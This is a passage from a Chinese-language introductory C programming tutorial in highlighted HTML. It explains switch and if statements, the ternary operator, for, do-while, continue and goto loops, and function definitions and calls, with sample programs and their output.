%d\n"</span>,  e );</span><br><span class="line"> </span><br><span class="line">   e = ((a + b) * c) / d;    <span class="comment">// (30 * 15 ) / 5</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"((a + b) * c) / d 的值是 %d\n"</span> ,  e );</span><br><span class="line"> </span><br><span class="line">   e = (a + b) * (c / d);   <span class="comment">// (30) * (15/5)</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"(a + b) * (c / d) 的值是 %d\n"</span>,  e );</span><br><span class="line"> </span><br><span class="line">   e = a + (b * c) / d;     <span class="comment">//  20 + (150/5)</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"a + (b * c) / d 的值是 %d\n"</span> ,  e );</span><br><span class="line">  </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当上面的代码被编译和执行时，它会产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(a + b) * c / d 的值是 <span class="number">90</span></span><br><span class="line">((a + b) * c) / d 的值是 <span class="number">90</span></span><br><span class="line">(a + b) * (c / d) 的值是 <span class="number">90</span></span><br><span class="line">a + (b * c) / d 的值是 <span class="number">50</span></span><br></pre></td></tr></table></figure><h2 id="C-判断"><a href="#C-判断" class="headerlink" title="C    判断"></a>C    判断</h2><h3 id="判断语句"><a href="#判断语句" class="headerlink" title="判断语句"></a>判断语句</h3><p>C 语言提供了以下类型的判断语句。点击链接查看每个语句的细节。</p><table><thead><tr><th align="left">语句</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">if 语句</td><td align="left">一个 <strong>if 语句</strong> 由一个布尔表达式后跟一个或多个语句组成。</td></tr><tr><td align="left">if…else 语句</td><td align="left">一个 <strong>if 语句</strong> 后可跟一个可选的 <strong>else 语句</strong>，else 语句在布尔表达式为假时执行。</td></tr><tr><td align="left">嵌套 if 语句</td><td align="left">您可以在一个 <strong>if</strong> 或 <strong>else if</strong> 语句内使用另一个 <strong>if</strong> 或 <strong>else if</strong> 语句。</td></tr><tr><td align="left">switch 语句</td><td align="left">一个 <strong>switch</strong> 语句允许测试一个变量等于多个值时的情况。</td></tr><tr><td align="left">嵌套 switch 语句</td><td align="left">您可以在一个 <strong>switch</strong> 语句内使用另一个 <strong>switch</strong> 语句。</td></tr></tbody></table><h4 id="C-switch语句"><a href="#C-switch语句" class="headerlink" title="C switch语句"></a>C switch语句</h4><p>C 语言中 <strong>switch</strong> 语句的语法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(expression)&#123;</span><br><span class="line">    <span class="keyword">case</span> constant-expression  :</span><br><span class="line">       statement(s);</span><br><span class="line">       <span class="keyword">break</span>; <span class="comment">/* 可选的 */</span></span><br><span class="line">    <span class="keyword">case</span> constant-expression  :</span><br><span class="line">       statement(s);</span><br><span class="line">       <span class="keyword">break</span>; <span class="comment">/* 可选的 */</span></span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* 您可以有任意数量的 case 语句 */</span></span><br><span class="line">    <span class="keyword">default</span> : <span class="comment">/* 可选的 */</span></span><br><span class="line">       statement(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>switch</strong> 语句必须遵循下面的规则：</p><ul><li><strong>switch</strong> 语句中的 <strong>expression</strong> 是一个常量表达式，必须是一个整型或枚举类型。</li><li>在一个 switch 中可以有任意数量的 case 语句。每个 case 后跟一个要比较的值和一个冒号。</li><li>case 的 <strong>constant-expression</strong> 必须与 switch 中的变量具有相同的数据类型，且必须是一个常量或字面量。</li><li>当被测试的变量等于 case 中的常量时，case 后跟的语句将被执行，直到遇到 <strong>break</strong> 语句为止。</li><li>当遇到 <strong>break</strong> 语句时，switch 终止，控制流将跳转到 switch 语句后的下一行。</li><li>不是每一个 case 都需要包含 <strong>break</strong>。如果 case 语句不包含 <strong>break</strong>，控制流将会 <em>继续</em> 后续的 case，直到遇到 break 为止。</li><li>一个 <strong>switch</strong> 语句可以有一个可选的 <strong>default</strong> case，出现在 switch 的结尾。default case 可用于在上面所有 case 都不为真时执行一个任务。default case 中的 <strong>break</strong> 语句不是必需的。</li></ul><p><strong>流程图</strong></p><p><img alt="C 中的 switch 语句" data-src="https://www.runoob.com/wp-content/uploads/2014/09/switch_statement.jpg" class="lazyload"></p><p><strong>实例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="comment">/* 局部变量定义 */</span></span><br><span class="line">   <span class="keyword">char</span> grade = <span class="string">'B'</span>;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">switch</span>(grade)</span><br><span class="line">   &#123;</span><br><span class="line">   <span class="keyword">case</span> <span class="string">'A'</span> :</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"很棒！\n"</span> );</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="string">'B'</span> :</span><br><span class="line">   <span class="keyword">case</span> <span class="string">'C'</span> :</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"做得好\n"</span> );</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="string">'D'</span> :</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"您通过了\n"</span> );</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="string">'F'</span> :</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"最好再试一下\n"</span> );</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">default</span> :</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"无效的成绩\n"</span> );</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"您的成绩是 %c\n"</span>, grade );</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当上面的代码被编译和执行时，它会产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">做得好</span><br><span class="line">您的成绩是 B</span><br></pre></td></tr></table></figure><h3 id="运算符-三元运算符"><a href="#运算符-三元运算符" class="headerlink" title="? : 运算符(三元运算符)"></a>? : 运算符(三元运算符)</h3><p>我们已经在前面的章节中讲解了 <strong>条件运算符 ? :</strong>，可以用来替代 <strong>if…else</strong> 语句。它的一般形式如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exp1 ? Exp2 : Exp3;</span><br></pre></td></tr></table></figure><p><strong>实例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"输入一个数字 : "</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;num);</span><br><span class="line"> </span><br><span class="line">    (num%<span class="number">2</span>==<span class="number">0</span>)?<span class="built_in">printf</span>(<span class="string">"偶数"</span>):<span class="built_in">printf</span>(<span class="string">"奇数"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-循环"><a href="#C-循环" class="headerlink" title="C    循环"></a>C    循环</h2><h3 id="循环类型"><a href="#循环类型" class="headerlink" title="循环类型"></a>循环类型</h3><p>C 语言提供了以下几种循环类型。点击链接查看每个类型的细节。</p><table><thead><tr><th align="left">循环类型</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><a href="https://www.runoob.com/cprogramming/c-while-loop.html">while 循环</a></td><td align="left">当给定条件为真时，重复语句或语句组。它会在执行循环主体之前测试条件。</td></tr><tr><td align="left"><a href="https://www.runoob.com/cprogramming/c-for-loop.html">for 循环</a></td><td align="left">多次执行一个语句序列，简化管理循环变量的代码。</td></tr><tr><td align="left"><a href="https://www.runoob.com/cprogramming/c-do-while-loop.html">do…while 循环</a></td><td align="left">除了它是在循环主体结尾测试条件外，其他与 while 语句类似。</td></tr><tr><td align="left"><a href="https://www.runoob.com/cprogramming/c-nested-loops.html">嵌套循环</a></td><td align="left">您可以在 while、for 或 do..while 循环内使用一个或多个循环。</td></tr></tbody></table><h4 id="for-循环"><a href="#for-循环" class="headerlink" title="for    循环"></a>for    循环</h4><p><strong>语法</strong></p><p>C 语言中 <strong>for</strong> 循环的语法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( init; condition; increment )</span><br><span class="line">&#123;</span><br><span class="line">   statement(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面是 for 循环的控制流：</p><ol><li><strong>init</strong> 会首先被执行，且只会执行一次。这一步允许您声明并初始化任何循环控制变量。您也可以不在这里写任何语句，只要有一个分号出现即可。</li><li>接下来，会判断 <strong>condition</strong>。如果为真，则执行循环主体。如果为假，则不执行循环主体，且控制流会跳转到紧接着 for 循环的下一条语句。</li><li>在执行完 for 循环主体后，控制流会跳回上面的 <strong>increment</strong> 语句。该语句允许您更新循环控制变量。该语句可以留空，只要在条件后有一个分号出现即可。</li><li>条件再次被判断。如果为真，则执行循环，这个过程会不断重复（循环主体，然后增加步值，再然后重新判断条件）。在条件变为假时，for 循环终止。</li></ol><p><strong>流程图</strong></p><p><img alt="C 中的 for 循环" data-src="https://www.runoob.com/wp-content/uploads/2014/09/69978E61-0BA5-4D66-A115-D3AD15B16F47.jpg" class="lazyload"></p><p><strong>实例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="comment">/* for 循环执行 */</span></span><br><span class="line">   <span class="keyword">for</span>( <span class="keyword">int</span> a = <span class="number">10</span>; a &lt; <span class="number">20</span>; a = a + <span class="number">1</span> )</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"a 的值： %d\n"</span>, a);</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当上面的代码被编译和执行时，它会产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">a 的值： <span class="number">10</span></span><br><span class="line">a 的值： <span class="number">11</span></span><br><span class="line">a 的值： <span class="number">12</span></span><br><span class="line">a 的值： <span class="number">13</span></span><br><span class="line">a 的值： <span class="number">14</span></span><br><span class="line">a 的值： <span class="number">15</span></span><br><span class="line">a 的值： <span class="number">16</span></span><br><span class="line">a 的值： <span class="number">17</span></span><br><span class="line">a 的值： <span class="number">18</span></span><br><span class="line">a 的值： <span class="number">19</span></span><br></pre></td></tr></table></figure><h4 id="do…while-循环"><a href="#do…while-循环" class="headerlink" title="do…while 循环"></a><strong>do…while</strong> 循环</h4><p><strong>语法</strong></p><p>C 语言中 <strong>do…while</strong> 循环的语法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">   statement(s);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">while</span>( condition );</span><br></pre></td></tr></table></figure><p><strong>流程图</strong></p><p><img alt="C 中的 do...while 循环" data-src="https://www.runoob.com/wp-content/uploads/2014/09/B2FE1EC7-6477-439B-8F50-82D537673799.jpg" class="lazyload"></p><p><strong>实例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="comment">/* 局部变量定义 */</span></span><br><span class="line">   <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* do 循环执行 */</span></span><br><span class="line">   <span class="keyword">do</span></span><br><span class="line">   &#123;</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"a 的值： %d\n"</span>, a);</span><br><span class="line">       a = a + <span class="number">1</span>;</span><br><span class="line">   &#125;<span class="keyword">while</span>( a &lt; <span class="number">20</span> );</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当上面的代码被编译和执行时，它会产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">a 的值： <span class="number">10</span></span><br><span class="line">a 的值： <span class="number">11</span></span><br><span class="line">a 的值： <span class="number">12</span></span><br><span class="line">a 的值： <span class="number">13</span></span><br><span class="line">a 的值： <span class="number">14</span></span><br><span class="line">a 的值： <span class="number">15</span></span><br><span class="line">a 的值： <span class="number">16</span></span><br><span class="line">a 的值： <span class="number">17</span></span><br><span class="line">a 的值： <span class="number">18</span></span><br><span class="line">a 的值： <span class="number">19</span></span><br></pre></td></tr></table></figure><h3 id="循环控制语句"><a href="#循环控制语句" class="headerlink" title="循环控制语句"></a>循环控制语句</h3><table><thead><tr><th align="left">控制语句</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><a href="https://www.runoob.com/cprogramming/c-break-statement.html">break 语句</a></td><td align="left">终止<strong>循环</strong>或 <strong>switch</strong> 语句，程序流将继续执行紧接着循环或 switch 的下一条语句。</td></tr><tr><td align="left"><a href="https://www.runoob.com/cprogramming/c-continue-statement.html">continue 语句</a></td><td align="left">告诉一个循环体立刻停止本次循环迭代，重新开始下次循环迭代。</td></tr><tr><td align="left"><a href="https://www.runoob.com/cprogramming/c-goto-statement.html">goto 语句</a></td><td align="left">将控制转移到被标记的语句。但是不建议在程序中使用 goto 语句。</td></tr></tbody></table><h4 id="continue-语句"><a href="#continue-语句" class="headerlink" title="continue 语句"></a>continue 语句</h4><p><strong>流程图</strong></p><p><img alt="C continue 语句" data-src="https://www.runoob.com/wp-content/uploads/2014/09/8962A4F1-B78C-4877-B328-903366EA1470.jpg" class="lazyload"></p><p><strong>实例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="comment">/* 局部变量定义 */</span></span><br><span class="line">   <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* do 循环执行 */</span></span><br><span class="line">   <span class="keyword">do</span></span><br><span class="line">   &#123;</span><br><span class="line">      <span class="keyword">if</span>( a == <span class="number">15</span>)</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="comment">/* 跳过迭代 */</span></span><br><span class="line">         a = a + <span class="number">1</span>;</span><br><span class="line">         <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"a 的值： %d\n"</span>, a);</span><br><span class="line">      a++;</span><br><span class="line">     </span><br><span class="line">   &#125;<span class="keyword">while</span>( a &lt; <span class="number">20</span> );</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当上面的代码被编译和执行时，它会产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a 的值： <span class="number">10</span></span><br><span class="line">a 的值： <span class="number">11</span></span><br><span class="line">a 的值： <span class="number">12</span></span><br><span class="line">a 的值： <span class="number">13</span></span><br><span class="line">a 的值： <span class="number">14</span></span><br><span class="line">a 的值： <span class="number">16</span></span><br><span class="line">a 的值： <span class="number">17</span></span><br><span class="line">a 的值： <span class="number">18</span></span><br><span class="line">a 的值： <span class="number">19</span></span><br></pre></td></tr></table></figure><h4 id="goto-语句"><a href="#goto-语句" class="headerlink" title="goto    语句"></a>goto    语句</h4><p><strong>语法</strong></p><p>C 语言中 <strong>goto</strong> 语句的语法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">goto</span> label;</span><br><span class="line">..</span><br><span class="line">.</span><br><span class="line">label: statement</span><br></pre></td></tr></table></figure><p><strong>流程图</strong></p><p><img alt="C goto 语句" data-src="https://www.runoob.com/wp-content/uploads/2014/09/cpp_goto_statement.jpg" class="lazyload"></p><p><strong>实例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="comment">/* 局部变量定义 */</span></span><br><span class="line">   <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* do 循环执行 */</span></span><br><span class="line">   LOOP:<span class="keyword">do</span></span><br><span class="line">   &#123;</span><br><span class="line">      <span class="keyword">if</span>( a == <span class="number">15</span>)</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="comment">/* 跳过迭代 */</span></span><br><span class="line">         a = a + <span class="number">1</span>;</span><br><span class="line">         <span class="keyword">goto</span> LOOP;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"a 的值： %d\n"</span>, a);</span><br><span class="line">      a++;</span><br><span class="line">     </span><br><span class="line">   &#125;<span class="keyword">while</span>( a &lt; <span class="number">20</span> );</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当上面的代码被编译和执行时，它会产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a 的值： <span class="number">10</span></span><br><span class="line">a 的值： <span class="number">11</span></span><br><span class="line">a 的值： <span class="number">12</span></span><br><span class="line">a 的值： <span class="number">13</span></span><br><span class="line">a 的值： <span class="number">14</span></span><br><span class="line">a 的值： <span class="number">16</span></span><br><span class="line">a 的值： <span class="number">17</span></span><br><span class="line">a 的值： <span class="number">18</span></span><br><span class="line">a 的值： <span class="number">19</span></span><br></pre></td></tr></table></figure><h2 id="C-函数"><a href="#C-函数" class="headerlink" title="C    函数"></a>C    函数</h2><p> 函数是一组一起执行一个任务的语句。每个 C 程序都至少有一个函数，即主函数 <strong>main()</strong> ，所有简单的程序都可以定义其他额外的函数。 </p><h3 id="定义函数"><a href="#定义函数" class="headerlink" title="定义函数"></a>定义函数</h3><p>C 语言中的函数定义的一般形式如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">return_type <span class="title">function_name</span><span class="params">( parameter <span class="built_in">list</span> )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   body of the function</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 C 语言中，函数由一个函数头和一个函数主体组成。下面列出一个函数的所有组成部分：</p><ul><li><strong>返回类型：</strong>一个函数可以返回一个值。<strong>return_type</strong> 是函数返回的值的数据类型。有些函数执行所需的操作而不返回值，在这种情况下，return_type 是关键字 <strong>void</strong>。</li><li><strong>函数名称：</strong>这是函数的实际名称。函数名和参数列表一起构成了函数签名。</li><li><strong>参数：</strong>参数就像是占位符。当函数被调用时，您向参数传递一个值，这个值被称为实际参数。参数列表包括函数参数的类型、顺序、数量。参数是可选的，也就是说，函数可能不包含参数。</li><li><strong>函数主体：</strong>函数主体包含一组定义函数执行任务的语句。</li></ul><p><strong>实例：</strong></p><p>以下是 <strong>max()</strong> 函数的源代码。该函数有两个参数 num1 和 num2，会返回这两个数中较大的那个数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 函数返回两个数中较大的那个数 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">max</span><span class="params">(<span class="keyword">int</span> num1, <span class="keyword">int</span> num2)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="comment">/* 局部变量声明 */</span></span><br><span class="line">   <span class="keyword">int</span> result;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">if</span> (num1 &gt; num2)</span><br><span class="line">      result = num1;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">      result = num2;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">return</span> result; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="函数声明"><a href="#函数声明" class="headerlink" title="函数声明"></a>函数声明</h3><p>函数<strong>声明</strong>会告诉编译器函数名称及如何调用函数。函数的实际主体可以单独定义。</p><p>函数声明包括以下几个部分：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">return_type <span class="title">function_name</span><span class="params">( parameter <span class="built_in">list</span> )</span></span>;</span><br></pre></td></tr></table></figure><p>针对上面定义的函数 max()，以下是函数声明：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">max</span><span class="params">(<span class="keyword">int</span> num1, <span class="keyword">int</span> num2)</span></span>;</span><br></pre></td></tr></table></figure><p>在函数声明中，参数的名称并不重要，只有参数的类型是必需的，因此下面也是有效的声明：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">max</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">int</span>)</span></span>;</span><br></pre></td></tr></table></figure><p>当您在一个源文件中定义函数且在另一个文件中调用函数时，函数声明是必需的。在这种情况下，您应该在调用函数的文件顶部声明函数。</p><h3 id="调用函数"><a href="#调用函数" class="headerlink" title="调用函数"></a>调用函数</h3><p><strong>实例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* 函数声明 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">max</span><span class="params">(<span class="keyword">int</span> num1, <span class="keyword">int</span> num2)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="comment">/* 局部变量定义 */</span></span><br><span class="line">   <span class="keyword">int</span> a = <span class="number">100</span>;</span><br><span class="line">   <span class="keyword">int</span> b = <span class="number">200</span>;</span><br><span class="line">   <span class="keyword">int</span> ret;</span><br><span class="line"> </span><br><span class="line">   <span class="comment">/* 调用函数来获取最大值 */</span></span><br><span class="line">   ret = <span class="built_in">max</span>(a, b);</span><br><span class="line"> </span><br><span class="line">   <span class="built_in">printf</span>( <span class="string">"Max value is : %d\n"</span>, ret );</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* 